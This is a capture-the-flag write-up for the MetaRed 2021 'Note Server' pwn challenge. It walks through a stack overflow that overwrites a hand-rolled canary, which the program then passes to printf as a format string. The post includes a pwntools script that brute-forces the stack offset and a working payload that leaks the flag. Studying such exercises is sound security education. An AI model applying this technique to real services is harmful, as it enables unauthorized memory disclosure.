---
title: 'MetaRed 2021 - 3rd Stage: Note Server'
date: 2021-11-06T00:00:00+00:00
author: Kris
layout: post
image: /images/2021/metared/title.png
categories:
  - Write-Ups
  - Pwn
---
I'm doing way more PWN challenges these days and have got into somewhat of a groove that I'm really enjoying them. I have a pattern of solutions in my head now and can solve at least the first basic level ones each time. This week was the CTF Internacional MetaRed 2021 - 3rd Stage. Long name! Also found it pretty challenging. Here's 1 fun pwn challenge.

#### <a name="noteserver"></a>Note Server - Pwn - 413 points

This challenge reads:

```
I made an app so you can keep notes online. Hope it doesn't get pwned.

nc 143.255.251.233 13372

15 Solves
```

With this challenge comes one file:

- `note_server`

Quickly triaging the binary its a 64 bit ELF binary and from `checksec` we can see canaries are disabled but PIE is enabled. Interesting.

```shell
$ file note_server
note_server: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), 
dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, 
BuildID[sha1]=99f105cee37ecd4ff434f2f07839e23d9200989d, for 
GNU/Linux 3.2.0, not stripped
$ checksec note_server
[*] 'note_server'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

Running the binary we see some basic behaviour, we can store notes in memory and read them back. It doesn't seem to work too well because it doesn't actually show us a note. It does mention `stack canaries` though. Even though `checksec` said that we did not have stack canaries. I guess the author implemented canaries manually.

```shell
$ ./note_server

================================
Welcome to note server 2021
Now with stack canaries!!!
================================

1. Write note
2. Read note
3. Exit
> 1
Choose a note [0 - 7]: 0
AAAAAAAAAAAAA

1. Write note
2. Read note
3. Exit
> 2
Choose a note [0 - 7]: 0


1. Write note
2. Read note
3. Exit
> 3
```

Loading the binary into Ghidra gives us an interesting glimpse into what might be a solution here.

First, in `main()` we load a flag into memory, display a banner, then pass the pointer to the flag to `note_server()`

```c
void main(void)
{
  char *flagptr;
  
  setup();
  flagptr = (char *)load_flag();
  banner();
  note_server(flagptr);
  return;
}
```

In `note_server()` we do all the heavy lifting of displaying the menu and reading / writing the notes. We even check our `canary ` here:

```c
void note_server(char *flagptr)

{
  char *canary;
  canary = _setup;
  do {
    while( true ) {
      while( true ) {
        puts("\n1. Write note");
        puts("2. Read note");
        puts("3. Exit");
        printf("> ");
        __s = "%d";
        iVar1 = scanf(&DAT_00102097,&local_119);
        if (iVar1 == 1) break;
        gets(__s);
      }
      if (local_119 == '\x03') {
        iVar1 = memcmp(&canary,setup,8);
        if (iVar1 == 0) {
          return;
        }
        printf("Overflow attempt. Canary value > ");
        printf((char *)&canary);
                    /* WARNING: Subroutine does not return */
        exit(0);
      }
      if (local_119 < '\x04') break;
LAB_001014cf:
      puts("Invalid option...\n");
    }
    if (local_119 == '\x01') {
      printf("Choose a note [0 - 7]: ");
      __isoc99_scanf(&DAT_00102097,&local_120);
      if ((local_120 < 0) || (7 < local_120)) {
        puts("Invalid note");
      }
      else {
        __isoc99_scanf(" %[^\n]",local_118 + (long)local_120 * 0x20);
      }
    }
    else {
      if (local_119 != '\x02') goto LAB_001014cf;
      printf("Choose a note [0 - 7]: ");
      __isoc99_scanf(&DAT_00102097,&local_120);
      if ((local_120 < 0) || (7 < local_120)) {
        puts("Invalid note");
      }
      else {
        puts(local_118 + (long)local_120 * 0x20);
      }
    }
  } while( true );
}
```

The critical point to note is in the canary validation which we do on exit (user selects `3` from the menu).

```c
        printf("Overflow attempt. Canary value > ");
        printf((char *)&canary);
```

Here we have a format string vulnerability, the program actually prints out whatever we overwrote the stack canary with. 

Since we know we took the `flagptr` as an argument to this function its probable our flag is on the stack somewhere. So our strategy is simple:

1. Find a way to stack overflow and overwrite exactly at our canary position with a format string.
2. Choose a format string that displays a string from the stack at some offset. We can use `%x$s` for this.

Ok first we need to find a stack overflow, the binary is simple so its probably in the `Read note` option. Instead of parsing the Ghidra code i just tried this:

```shell
gdb-peda$ r
Starting program: note_server 
================================
Welcome to note server 2021
Now with stack canaries!!!
================================

1. Write note
2. Read note
3. Exit
> 1
Choose a note [0 - 7]: 0
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

1. Write note
2. Read note
3. Exit
> 2
Choose a note [0 - 7]: 0


1. Write note
2. Read note
3. Exit
> 3
Overflow attempt. Canary value > AAAAAAAA
```

Ok cool so we know we can control the Canary that gets printed. We need to know where in our string that happens. I tried using `peda` `pattern_create` for this but because it creates strings that have `%` in them it doesn't work for this purpose. I just manually crafted some long strings instead.

With some trial and error I found the offset to be 264 bytes. I generated these strings with some python command line:

```shell
$ python -c 'print(("A" * 264) + "BBBB")'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB
$ ./note_server
================================
Welcome to note server 2021
Now with stack canaries!!!
================================

1. Write note
2. Read note
3. Exit
> 1
Choose a note [0 - 7]: 0
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB

1. Write note
2. Read note
3. Exit
> 2
Choose a note [0 - 7]: 0


1. Write note
2. Read note
3. Exit
> 3
Overflow attempt. Canary value > BBBB

```

Great. Now we just need to find our flag position on the stack, I wrote some python to try all the offsets:

```python
from pwn import *

offset = 264

for i in range(1, 100):
    p = process('./note_server')
    p.sendlineafter(b'> ', b'1')  # Write note
    p.sendlineafter(b']: ', b'0') # Note 0
    payload = b'A' * offset
    payload += b'%%%d$s' % i      # format string in the canary position
    p.sendline(payload)           # Send content of note.
    p.sendlineafter(b'> ', b'2')  # Read note
    p.sendlineafter(b']: ', b'0') # Note 0
    p.sendlineafter(b'> ', b'3')  # Exit
    try:
        res = p.recvall().decode().split('> ')[1]            # fmt string result.
        if 'testflag' in res:
            print('flag at %d' % i)
            print('use payload: %s' % payload)
            break
    except:
        continue
    p.close()
```

Then I ran it and it found the right offset:

```shell
$ echo testflag > flag.txt
$ PWNLIB_SILENT=1 ./leak.py
flag at 45
use payload: b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA%45$s'
```

Which when we ran it against the live service dropped the flag:

```shell
================================
Welcome to note server 2021
Now with stack canaries!!!
================================

1. Write note
2. Read note
3. Exit
> 1
Choose a note [0 - 7]: 0
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA%45$s

1. Write note
2. Read note
3. Exit
> 2
Choose a note [0 - 7]: 0


1. Write note
2. Read note
3. Exit
> 3
Overflow attempt. Canary value > FLAG{realflagwashere}
```

Fun and no RCE needed :)
